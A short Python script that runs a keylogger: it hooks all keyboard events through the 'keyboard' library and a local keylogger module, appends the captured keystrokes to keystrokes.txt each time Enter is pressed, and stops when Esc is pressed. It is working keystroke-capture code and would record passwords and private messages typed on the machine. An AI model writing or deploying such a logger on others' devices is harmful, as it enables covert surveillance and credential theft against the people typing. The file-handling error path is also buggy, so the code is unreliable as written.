import keyboard
import keylogger


def onKeyEvent(e, keylogger_instance):
    if e.event_type == keyboard.KEY_DOWN and e.name == 'enter':
        keystrokes = endAndRestartKeylogger(keylogger_instance)
        try:
            file = open("keystrokes.txt", "a")
            file.write(keystrokes + "\nPRESSED ENTER HERE\n\n")
        except Exception as ex:
            print(f"Error writing to file: {ex}")
        finally:
            file.close()

def endAndRestartKeylogger(keylogger_instance):
    stoppedRecording = keylogger_instance.stopRecording()
    keysPressed = keylogger_instance.getTypedStrings(stoppedRecording)
    keystrokes = keylogger_instance.writeKeysPressed(keysPressed)
    print(keystrokes)
    keylogger_instance.startRecording()
    return keystrokes

def main():

    keylogger_instance = keylogger.Keylogger()

    keylogger_instance.startRecording()

    keyboard.hook(lambda e: onKeyEvent(e, keylogger_instance))

    keyboard.wait("esc")

    # Ensure proper cleanup
    keyboard.unhook_all()


main()
